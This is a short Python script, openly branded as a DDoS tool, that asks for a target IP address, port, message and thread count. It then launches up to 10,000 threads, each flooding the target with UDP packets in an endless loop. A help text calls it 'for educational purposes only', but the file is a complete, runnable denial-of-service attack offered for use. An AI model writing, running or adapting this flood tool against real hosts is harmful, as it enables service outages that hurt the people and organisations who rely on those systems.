import socket
import threading
import time

# ASCII Art for "DDoS"
ascii_art = r"""
  ____        ____   ____   _____  
 |  _ \      |  _ \ / __ \ / ____| 
 | | | |     | | | | |  | | (___   
 | | | |     | | | | |  | |\___ \  
 | |_| |     | |_| | |__| |____) | 
 |____/      |____/ \____/|_____/  
                                    
                     by Noah Bank v1.16
"""

def send_packet(ip, port, message):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Create a UDP socket
        sock.sendto(message.encode(), (ip, port))  # Send the message
        print(f"Sent: {message} to {ip}:{port}")
    except Exception as e:
        print(f"Error: {e}")

def thread_function(ip, port, message):
    while True:
        send_packet(ip, port, message)

def show_help():
    help_text = """
    Usage:
    python packet_sender.py

    Commands:
    - Enter the target IP address: The IP address of the server you want to send packets to.
    - Enter the target port number: The port number on the server you want to target.
    - Enter the message to send: The message you want to send in the packets.
    - Enter the number of threads (up to 10000): The number of threads to use for sending packets.

    Note: This tool is for educational purposes only. Ensure you have permission to test any network or server.
    """
    print(help_text)

def main():
    print(ascii_art)  # Print the ASCII art and author info
    show_help()  # Show help information

    ip = input("Enter the target IP address: ")
    port = int(input("Enter the target port number: "))
    message = input("Enter the message to send: ")
    thread_count = int(input("Enter the number of threads (up to 10000): "))

    threads = []
    for i in range(thread_count):
        thread = threading.Thread(target=thread_function, args=(ip, port, message))
        thread.start()
        threads.append(thread)
        time.sleep(0.01)  # Small delay to avoid overwhelming the system

    for thread in threads:
        thread.join()  # Wait for all threads to finish

if __name__ == "__main__":
    main()